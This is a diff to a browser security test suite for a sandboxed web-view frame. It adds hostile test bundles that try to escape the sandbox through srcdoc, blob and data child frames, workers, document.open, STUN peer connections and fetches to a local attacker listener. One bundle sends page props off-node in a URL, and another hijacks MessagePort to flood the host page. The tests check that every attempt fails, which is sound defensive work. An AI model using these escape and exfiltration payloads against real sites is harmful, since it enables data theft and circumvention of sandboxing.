@@ -8,6 +8,15 @@
 //   `<a ping>`, links that prefetch, and navigating itself off the node.
 //   The listener must hear nothing. When it leaves its document, the page
 //   takes it down and its own controls come back.
+// - The review's probes (#608): child frames of every kind (about:blank,
+//   srcdoc, blob:, data:, the webview-rtc document, the default one, and
+//   srcdoc children running the frame's own script with WebRTC switched
+//   on), workers, `document.open`; each tries a STUN peer connection and a
+//   fetch to the listener, so any escape is a hit.
+// - Navigating itself to the webview-rtc document (not served on a node
+//   that grants no island WebRTC: a 404, and a second load, so gone).
+// - The port captured and flooded (hello, ready, size, asks): booted once,
+//   reported through the page's playhead.
 // - WebRTC granted by the operator and declared by the manifest: the frame
 //   is the `webview-rtc` document and a loopback peer connection works in
 //   it. Granted but not declared: the default document, no WebRTC.
@@ -16,7 +25,8 @@
 // WebDriver BiDi) or DRIVER=safari (`safaridriver`, classic WebDriver; run
 // `safaridriver --enable` once on the Mac). The bundle reports what it saw
 // by asking the page to seek (a number the page's playhead then holds), so
-// both drivers read it the same way.
+// both drivers read it the same way; an escape is a hit on the listener
+// (Safari's classic WebDriver has no console to read).
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { spawn, execFileSync } from 'node:child_process';
@@ -46,8 +56,9 @@ function wav(seconds) {
 // by these bundles, only carried.
 const WASM = Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
 
-/// A bundle that tries every way out to the attacker at `a` (http://host:port).
-const EVIL = (a, port) => `
+/// A bundle that tries every way out to the attacker at `a` (http://host:port),
+/// `rtc` the path of the node's webview-rtc document.
+const EVIL = (a, port, rtc) => `
 export default async function init() {}
 export function mount() {
   const A = ${JSON.stringify(a)};
@@ -65,6 +76,50 @@ export function mount() {
   t(() => window.open(A + "/popup"));
   t(() => { top.location = A + "/top"; });
   t(() => import(A + "/import.js"));
+  // What a child or a worker tries: a STUN peer connection and a fetch.
+  const STUN = JSON.stringify({ iceServers: [{ urls: "stun:127.0.0.1:${port}" }] });
+  const payload = (tag) => "try { const pc = new RTCPeerConnection(" + STUN + "); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {} try { fetch(" + JSON.stringify(A) + " + '/kid-" + tag + "'); } catch (e) {}";
+  const blob = (tag, type) => URL.createObjectURL(new Blob([payload(tag)], { type: type || "text/javascript" }));
+  // Child frames, every kind: a fresh global has its own constructors.
+  const kids = [
+    ["about-blank", () => {}],
+    ["srcdoc", (f) => { f.srcdoc = "<script>" + payload("srcdoc") + "<\\/script>"; }],
+    ["blob", (f) => { f.src = URL.createObjectURL(new Blob(["<script>" + payload("blob-doc") + "<\\/script>"], { type: "text/html" })); }],
+    ["data", (f) => { f.src = "data:text/html," + encodeURIComponent("<script>" + payload("data-doc") + "<\\/script>"); }],
+    ["rtc-doc", (f) => { f.src = ${JSON.stringify(rtc)}; }],
+    ["default-doc", (f) => { f.src = location.pathname; }],
+  ];
+  const own = document.scripts[0] ? document.scripts[0].textContent : "";
+  const docs = {
+    "module-parent-blob": '<script type="module" src="' + blob("module-parent-blob") + '"><\\/script>',
+    "classic-parent-blob": '<script src="' + blob("classic-parent-blob") + '"><\\/script>',
+    "rtc-variant-inline": "<script>" + own.replace("var RTC = false;", "var RTC = true;") + "<\\/script><script>" + payload("rtc-variant") + "<\\/script>",
+    "own-webview": '<div id="main"></div><script>' + own + "<\\/script>",
+  };
+  for (const [name, html] of Object.entries(docs)) kids.push([name, (f) => { f.srcdoc = html; }]);
+  for (const [name, set] of kids) {
+    t(() => {
+      const f = document.createElement("iframe");
+      set(f);
+      document.body.appendChild(f);
+      t(() => { const C = f.contentWindow && f.contentWindow.RTCPeerConnection; if (C) { const pc = new C(JSON.parse(STUN)); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } });
+      f.addEventListener("load", () => {
+        t(() => { const C = f.contentWindow && f.contentWindow.RTCPeerConnection; if (C) { const pc = new C(JSON.parse(STUN)); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } });
+        // Be the parent of a web view document and boot a payload in it.
+        t(() => {
+          const ch = new MessageChannel();
+          f.contentWindow.postMessage("architect-web", "*", [ch.port2]);
+          const src = new TextEncoder().encode("export default async function(){} export function mount(){ " + payload("booted-" + name) + " }");
+          setTimeout(() => ch.port1.postMessage({ t: "boot", entry: "web-x.js", view: "v", files: { "web-x.js": src, "web-x_bg.wasm": new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]) } }), 300);
+        });
+      });
+    });
+  }
+  t(() => new Worker(blob("worker")));
+  t(() => new SharedWorker(blob("sharedworker")));
+  t(() => navigator.serviceWorker.register("/sw.js"));
+  // A new document in the same window: its globals as the page left them?
+  setTimeout(() => t(() => { document.open(); document.write("<p>x</p>"); document.close(); const C = globalThis.RTCPeerConnection || globalThis.webkitRTCPeerConnection; if (C) { const pc = new C(JSON.parse(STUN)); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } }), 2500);
   // Off the node, carrying what the page handed it (the page's frame-src
   // refuses it: the frame stays where it is) ...
   setTimeout(() => { location.href = A + "/selfnav?props=" + encodeURIComponent(JSON.stringify(globalThis.architectPage.props)); }, 3000);
@@ -92,6 +147,32 @@ export function mount() {
       say(7);
     } catch (e) { say(3); }
   })();
+}`;
+
+/// A bundle that navigates itself to `rtc` (the webview-rtc document).
+const SELF_TO_RTC = (rtc) => `
+export default async function init() {}
+export function mount() { setTimeout(() => { location.href = ${JSON.stringify(rtc)}; }, 1500); }`;
+
+/// A bundle that captures the frame's port and floods the page: hellos,
+/// readies, sizes, asks. Then, once the page's rate limit has refilled, it
+/// reports how many times the page booted it again (it was booted once,
+/// before it mounted) by asking the page to seek to 20 + boots.
+const FLOOD = `
+export default async function init() {}
+export function mount() {
+  let port = null; const orig = MessagePort.prototype.postMessage;
+  MessagePort.prototype.postMessage = function () { port = this; return orig.apply(this, arguments); };
+  globalThis.architectPage.ask("nothing");
+  MessagePort.prototype.postMessage = orig;
+  if (!port) return;
+  let boots = 0;
+  port.addEventListener("message", (m) => { if ((m.data || {}).t === "boot") boots++; });
+  for (let i = 0; i < 500; i++) orig.call(port, { t: "hello" });
+  for (let i = 0; i < 500; i++) orig.call(port, { t: "ready" });
+  for (let i = 0; i < 5000; i++) orig.call(port, { t: "size", height: (i % 2) ? 100 : 3000 });
+  for (let i = 0; i < 1000; i++) orig.call(port, { t: "ask", action: "PLAYHEAD_SEEK", args: { t: (i % 10) + 1 } });
+  setTimeout(() => globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: 20 + boots }), 4000);
 }`;
 
 const CODE = 'gigabcdefhjkmnpq', L = `/s/${CODE}`;
@@ -215,9 +296,28 @@ async function openView(tab, origin) {
   await until(tab, 'document.querySelector("iframe.site-now-web")', 'the frame');
 }
 
-test('a default web view reaches nothing off the node, and leaving its document gives the controls back', { skip, timeout: 120000 }, async () => {
+/// The webview-rtc document's path (the same on every node of a build),
+/// read from a node that grants it.
+let rtcDoc = null;
+async function rtcPath() {
+  if (rtcDoc) return rtcDoc;
+  const { origin, close } = await node(RTC, { caps: { webrtc: ['peer-connections'] }, grant: true });
+  try {
+    const html = await fetch(`${origin}${L}/03-list/`).then((r) => r.text());
+    const m = /\/_ext\/webview-rtc\.[0-9a-f]+\.html/.exec(html);
+    assert.ok(m, 'a granted node names its webview-rtc document');
+    rtcDoc = m[0];
+    assert.equal((await fetch(origin + rtcDoc)).status, 200, 'served where granted');
+  } finally {
+    close();
+  }
+  return rtcDoc;
+}
+
+test('a default web view reaches nothing off the node, and leaving its document gives the controls back', { skip, timeout: 180000 }, async () => {
+  const rtc = await rtcPath();
   const atk = attacker();
-  const { origin, close } = await node(EVIL(atk.url, atk.port));
+  const { origin, close } = await node(EVIL(atk.url, atk.port, rtc));
   const tab = await open();
   try {
     await openView(tab, origin);
@@ -229,9 +329,44 @@ test('a default web view reaches nothing off the node, and leaving its document 
     assert.equal(await tab.eval('document.querySelectorAll("iframe.site-now-web").length'), 0, 'the frames are gone');
     assert.equal(await tab.eval('document.querySelector(".site-now-controls").classList.contains("site-now-yielded")'), false, 'the controls are back');
     assert.equal(await tab.eval('document.querySelector(".site-now-progress").classList.contains("site-now-yielded")'), false);
-    // Its navigation to the node's sign-out was refused (not the node's own
-    // page asking): a visitor's cookie stays.
+    // Its navigation to the node's sign-out was a GET: a page asking, the
+    // visitor's cookie kept.
     assert.equal(await tab.eval('document.cookie.includes("probe=kept")'), true);
+  } finally {
+    await tab.close();
+    close();
+    atk.close();
+  }
+});
+
+test('navigating itself to the webview-rtc document: not served here, the frame taken down', { skip, timeout: 180000 }, async () => {
+  const rtc = await rtcPath();
+  const atk = attacker();
+  const { origin, close } = await node(SELF_TO_RTC(rtc));
+  const tab = await open();
+  try {
+    assert.equal((await fetch(origin + rtc)).status, 404, 'a node granting no island WebRTC has no such document');
+    await openView(tab, origin);
+    await until(tab, 'document.querySelectorAll("iframe.site-now-web").length === 0', 'the frame taken down');
+    assert.equal(await tab.eval('document.querySelector(".site-now-progress").classList.contains("site-now-yielded")'), false, 'the page\'s own bar back');
+    assert.deepEqual(atk.hits, []);
+  } finally {
+    await tab.close();
+    close();
+    atk.close();
+  }
+});
+
+test('a frame that captures its port and floods the page is booted once and stays up', { skip, timeout: 120000 }, async () => {
+  const atk = attacker();
+  const { origin, close } = await node(FLOOD);
+  const tab = await open();
+  try {
+    await openView(tab, origin);
+    await until(tab, 'Math.round(architect.playhead.time) >= 20', 'the bundle\'s report', 30000);
+    assert.equal(Math.round(await tab.eval('architect.playhead.time')), 20, 'never booted again, after 500 hellos');
+    assert.equal(await tab.eval('document.querySelectorAll("iframe.site-now-web").length > 0'), true, 'still up: a flood is not an error');
+    assert.deepEqual(atk.hits, []);
   } finally {
     await tab.close();
     close();
